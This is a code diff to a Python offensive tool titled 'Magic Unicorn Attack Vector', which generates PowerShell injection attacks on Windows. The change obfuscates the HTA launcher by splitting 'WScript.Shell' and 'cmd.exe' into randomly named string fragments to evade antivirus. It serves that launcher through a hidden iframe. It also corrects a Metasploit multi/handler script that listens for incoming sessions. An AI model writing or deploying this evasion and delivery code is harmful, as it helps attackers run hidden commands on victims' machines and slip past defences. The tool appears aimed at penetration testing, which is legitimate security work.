@@ -196,7 +196,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.5.1 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.6 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -349,26 +349,45 @@ def gen_cert_attack(filename):
         print("[!] File was not found. Exiting the unicorn attack.")
         sys.exit()
 
-        # generate HTA attack method
-
-
+# Generate HTA launchers and index
 def gen_hta_attack(command):
     # HTA code here
-    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c {0}', 0);window.close();\n</script>""".format(
-        command)
-    main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""
 
-    # make a directory if its not there
-    if not os.path.isdir("hta_attack"):
-        os.makedirs("hta_attack")
+    command = command.replace("'", "\\'")
+    # generate random variable names for vba
+    hta_rand = generate_random_string(10, 30)
+
+    # split up so we arent calling shell command for cmd.exe
+    shell_split1 = generate_random_string(10, 30)
+    shell_split2 = generate_random_string(10, 30)
+    shell_split3 = generate_random_string(10, 30)
+    shell_split4 = generate_random_string(10, 30)
+    shell_split5 = generate_random_string(10, 30)
+
+    cmd_split1 = generate_random_string(10, 30)
+    cmd_split2 = generate_random_string(10, 30)
+    cmd_split3 = generate_random_string(10, 30)
+    cmd_split4 = generate_random_string(10, 30)
+    
+    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
+    main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
+    main3 = ("""' + {0} + """.format(cmd_split4))
+    main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
+    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>""")
+
+    # remote old directory
+    if os.path.isdir("hta_attack"):
+        shutil.rmtree("hta_attack") 
+
+    os.makedirs("hta_attack")
 
     # write out index file
     print("[*] Writing out index file to hta_attack/index.html")
-    write_file("hta_attack/index.html", main2)
+    write_file("hta_attack/index.html", html_code)
 
     # write out Launcher.hta
     print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
-    write_file("hta_attack/Launcher.hta", main1)
+    write_file("hta_attack/Launcher.hta", main1 + main2 + main3 + main4)
 
 
 # generate the actual shellcode through msf
@@ -427,7 +446,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # write out rc file
     write_file(
-        "unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
+        "unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
